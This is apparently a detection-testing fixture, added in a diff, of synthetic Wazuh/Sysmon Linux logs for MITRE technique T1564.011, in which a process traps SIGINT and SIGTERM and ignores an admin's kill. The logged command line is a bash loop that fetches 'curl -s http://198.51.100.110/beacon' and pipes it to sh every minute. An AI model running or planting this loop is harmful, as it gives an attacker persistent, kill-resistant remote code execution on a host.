@@ -1,0 +1,199 @@
+{
+  "_metadata": {
+    "attack_id": "T1564.011",
+    "variation": "001",
+    "name": "Ignore Process Interrupts - Signal Trapping",
+    "description": "Bash script trapping SIGINT and SIGTERM signals to prevent termination",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "defense-evasion",
+    "tactic": "Defense Evasion",
+    "os": "Linux",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Linux Event 1 - Bash script with signal trapping",
+      "sequence": 1,
+      "timestamp": "2026-02-10T20:24:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:24:00.000Z",
+        "rule": {
+          "level": 11,
+          "description": "Sysmon Linux - Event 1: Bash script with trap command (signal interception)",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1564.011"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Hide Artifacts: Ignore Process Interrupts"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600240.000001",
+        "decoder": {
+          "name": "linux_sysmon"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 20:24:00.000",
+            "processGuid": "{B5A2D3E4-AAAA-BBBB-CCCC-333333333333}",
+            "processId": "9234",
+            "image": "/bin/bash",
+            "commandLine": "/bin/bash -c 'trap \"\" SIGINT SIGTERM; while true; do curl -s http://198.51.100.110/beacon | sh; sleep 60; done'",
+            "currentDirectory": "/tmp",
+            "user": "attacker",
+            "integrityLevel": "medium",
+            "hashes": "SHA256=LEGIT_BASH_HASH",
+            "parentProcessGuid": "{B5A2D3E4-AAAA-BBBB-CCCC-000000000002}",
+            "parentProcessId": "8932",
+            "parentImage": "/usr/bin/ssh",
+            "parentCommandLine": "sshd: attacker@pts/0"
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Linux Event 1 - Kill attempt (caught and ignored)",
+      "sequence": 2,
+      "timestamp": "2026-02-10T20:24:15.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:24:15.000Z",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon Linux - Event 1: Kill command issued but process continues (signal ignored)",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1564.011"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Hide Artifacts: Ignore Process Interrupts"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600255.000001",
+        "decoder": {
+          "name": "linux_sysmon"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 20:24:15.000",
+            "processGuid": "{B5A2D3E4-AAAA-BBBB-CCCC-444444444444}",
+            "processId": "9456",
+            "image": "/usr/bin/kill",
+            "commandLine": "kill -15 9234",
+            "currentDirectory": "/home/admin2",
+            "user": "admin2",
+            "integrityLevel": "medium",
+            "hashes": "SHA256=LEGIT_KILL_HASH",
+            "parentProcessGuid": "{B5A2D3E4-AAAA-BBBB-CCCC-000000000003}",
+            "parentProcessId": "9123",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Linux Event 1 - Process continues after kill attempt",
+      "sequence": 3,
+      "timestamp": "2026-02-10T20:24:30.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:24:30.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon Linux - Event 1: Process still running 15s after kill (signal trapping confirmed)",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1564.011"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Hide Artifacts: Ignore Process Interrupts"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600270.000001",
+        "decoder": {
+          "name": "linux_sysmon"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 20:24:30.000",
+            "processGuid": "{B5A2D3E4-AAAA-BBBB-CCCC-333333333333}",
+            "processId": "9234",
+            "image": "/usr/bin/curl",
+            "commandLine": "curl -s http://198.51.100.110/beacon",
+            "currentDirectory": "/tmp",
+            "user": "attacker",
+            "integrityLevel": "medium",
+            "hashes": "SHA256=LEGIT_CURL_HASH",
+            "parentProcessGuid": "{B5A2D3E4-AAAA-BBBB-CCCC-333333333333}",
+            "parentProcessId": "9234",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "/bin/bash -c 'trap \"\" SIGINT SIGTERM; while true; do curl -s http://198.51.100.110/beacon | sh; sleep 60; done'"
+          }
+        }
+      }
+    }
+  ]
+}
